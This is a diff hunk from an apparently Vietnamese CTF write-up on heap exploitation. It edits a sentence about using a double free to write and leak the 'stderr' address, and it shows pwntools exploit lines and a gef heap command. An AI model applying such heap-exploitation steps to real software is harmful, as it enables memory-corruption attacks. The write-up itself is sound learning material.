@@ -152,7 +152,7 @@ p.sendlineafter(b'>', b"3")
 p.sendlineafter(b'>', b"2")
 p.sendafter(b'Content: ', p64(exe.sym['stderr']))
 ```
-Ta sẽ double free và ghi địa chỉ got của puts vào và đọc nó ra
+Ta sẽ double free và ghi địa chỉ got của stderr vào và đọc nó ra
 
 ```java
 gef➤  heap bins
